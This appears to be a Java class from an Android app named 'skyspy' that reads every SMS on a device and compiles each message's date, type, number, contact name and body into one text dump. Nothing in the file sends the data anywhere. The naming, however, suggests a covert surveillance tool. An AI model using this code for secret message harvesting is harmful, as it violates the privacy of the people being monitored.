package com.example.skyspy.app.sms;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsReader {

    private Context mContext;

    public SmsReader(Context context) {
        mContext = context;
    }

    public String getSmsList() {
        Uri smsUri = Uri.parse("content://sms/");
        Cursor cur = mContext.getContentResolver().query(smsUri, null, null, null, null);
        String sms = "";
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndexOrThrow("address"));
            sms += "Date: "+ SmsHelper.convertDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
            sms += "Type: "+SmsHelper.getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")))+"\n";
            if (number != null) {
                sms += "Number: "+number+"\n";
            } else {
                number = SmsHelper.getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")), mContext);
                sms += "Number: "+number+"\n";
            }
            sms += "Name: "+SmsHelper.getContactName(number, mContext)+"\n";
            sms += "Body: "+SmsHelper.removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
            sms += "_______________"+"\n\n";
        }
        cur.close();
        return sms;
    }
}
